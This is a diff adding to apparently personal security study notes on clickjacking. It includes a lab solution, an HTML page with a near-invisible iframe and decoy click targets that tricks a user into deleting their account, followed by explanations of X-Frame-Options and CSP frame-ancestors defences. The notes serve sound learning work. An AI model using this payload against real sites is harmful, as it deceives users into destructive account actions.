@@ -163,3 +163,93 @@ For example if you are ordering something from a store, you need to add an item 
 These actions can be implemented by using multiple divisions or iframes (`<div> & <iframe>`), they require precision to be effective and stealthy.
 So basically, stacking div elements and iframes to make more user actions possible.
 
+**LAB** - Make user delete their account using clickjacking, CSRF token protected and with deletion confirmation.
+
+```html
+<style>
+    iframe {
+        position:relative;
+        width:200px;
+        height: 600px;
+        opacity: 0.004;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:495px;
+        left:75px;
+        z-index: 1;
+    }
+    p {
+        position:absolute;
+        top:300px;
+        left:95px;
+        z-index: 1;
+    }
+</style>
+<div>Click me first</div>
+<p>Click me next</p>
+<iframe src="https://0abc0095049bf38882efde5300c70092.web-security-academy.net/my-account"></iframe>
+```
+
+As you can see everything is mostly the same, except we have a paragraph tag and it's CSS settings.
+
+
+#### Preventing clickjacking
+
+As mentioned previously, frame busting scripts can be bypassed relatively easily.
+Thus server driven protocols are utilized to prevent and constrain usage of browser iframe.
+
+Clickjacking is ultimately a `browser-side behavior` and it depends on it's functionality.
+Server-side protection is done by restraining the use of components such as iframes.
+
+However this implementation effectiveness depends on `browser compliance` and enforcement of the constraints.
+Two mechanisms for `server-side` clickjacking protection are `X-Frame-Options` and `Content Security Policy`.
+
+
+#### X-Frame-Options
+
+This header is a part of a defense against clickjacking.
+
+It allows the website owner to control use of iframes to render a webpage and such.
+```html
+X-Frame-Options: deny
+```
+
+Alternatively it can be restricted to same origin as the website.
+```html
+X-Frame-Options: sameorigin
+```
+
+Or to a allowed website, (kind of like a whitelist)
+```html
+X-Frame-Options: allow-from https://normal-website.com
+```
+
+These options are not a official header options.
+But browsers are implementing it, so some options may not be implemented yet, depends per browser basis.
+
+However when used in tandem with `Content Security Policy` it can serve as a good protection against clickjacking.
+
+
+#### Content Security Policy (CSP)
+
+Is a detection and prevention system that protects against attacks such as `XSS` and `clickjacking`.
+`CSP` is implemented in the web server as a return header of the from.
+
+```html
+Content-Security-Policy: policy
+```
+
+The policy is a string of directives separated by `;`.
+
+`CSP` provides the browser with info about permitted sources of web resources.
+With that info, the browser can `detect and prevent` malicious behavior.
+
+Recommended protection is to use:
+- The `frame-ancestors 'none'` the equivalent of `X-Frame-Options: deny`.
+- The `frame-ancestors 'self'` as the equivalent of `X-Frame-Options: sameorigin`.
+- The `Content-Security-Policy: frame-ancestors normal-website.com;` as `X-Frame-Options: allow-from https://normal-website.com`.
+
+As a solution to clickjacking and XSS attacks CSPs need careful implementation and testing, as a part of multi-layer defense strategy.
+
